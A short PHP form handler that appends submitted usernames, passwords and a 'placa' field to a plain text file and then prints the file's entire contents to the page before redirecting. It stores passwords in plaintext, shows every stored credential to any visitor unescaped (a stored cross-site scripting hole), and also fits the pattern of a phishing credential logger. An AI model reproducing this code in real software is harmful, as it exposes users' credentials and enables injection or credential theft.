<?php

$filename = "banco.txt";
if(!file_exists("banco.txt")){
    $handle = fopen("banco.txt", "w");
} else {
    $handle = fopen("banco.txt", "a");
}

fwrite($handle, $_POST['username']);
fwrite($handle, $_POST['password']);
fwrite($handle, $_POST['placa']);
fflush($handle);
fclose($handle);

$handle = fopen( "banco.txt", "r");
while (!feof($handle)) {
        $line = fgets($handle);
        echo $line ."<br>";
    }
fclose($handle);
header("location: WELCOME.php");
    exit;
?>